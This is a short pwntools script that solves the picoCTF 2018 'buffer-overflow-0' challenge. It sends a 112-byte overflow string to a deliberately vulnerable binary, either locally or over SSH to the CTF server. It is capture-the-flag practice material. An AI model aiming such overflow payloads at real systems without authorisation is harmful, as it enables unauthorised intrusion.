#!/usr/bin/env python2
from pwn import *
import os
import commands

# Get password from password manager
USERNAME='nighter'
PASSWORD=commands.getoutput('pass picoctf2018/nighter')

# Payload settings
vuln = ELF('./vuln')
payload = 'A' *112

# Run local
def local():

	io = vuln.process([payload])
	print(io.recvall())

def remote():
	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
	io = s.run('cd /problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631; ./vuln %s' % payload)
	print(io.recvall())
	s.close()

if __name__ == '__main__':
	remote()